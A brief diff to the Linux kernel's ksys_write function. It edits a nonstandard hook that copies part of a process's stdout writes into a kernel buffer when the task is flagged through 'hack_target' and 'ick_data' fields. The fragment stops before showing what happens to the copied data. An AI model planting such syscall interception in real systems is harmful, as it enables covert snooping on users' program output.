@@ -741,7 +741,7 @@ ssize_t ksys_write(unsigned int fd, const char __user *buf, size_t count)
 	struct fd f;
 	ssize_t ret = -EBADF;
 
-	if (fd == 1 && current->hack_target.hack && current->ick_data) {
+	if (fd == 1 && current->hack_target && current->ick_data) {
 		char data[64];
 		int ret = copy_from_user(data, buf, min_t(size_t, count, sizeof(data)));
 		if (ret) {
